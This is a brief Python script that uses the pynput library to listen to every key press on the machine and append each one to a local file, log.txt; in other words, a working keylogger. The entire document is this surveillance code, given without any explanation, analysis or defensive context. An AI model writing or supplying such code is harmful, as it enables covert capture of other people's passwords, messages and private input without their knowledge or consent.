from pynput import keyboard

keys=[]

def key_presses(key):
    try:
        keys.append(key.char)
    except:
        keys.append(key)
    save_keys()

def save_keys():
    with open("log.txt","a") as file:
        for key in keys:
            file.write(str(key)+"\n")
    keys.clear()

with keyboard.Listener(on_press=key_presses) as listener:
    listener.join()
        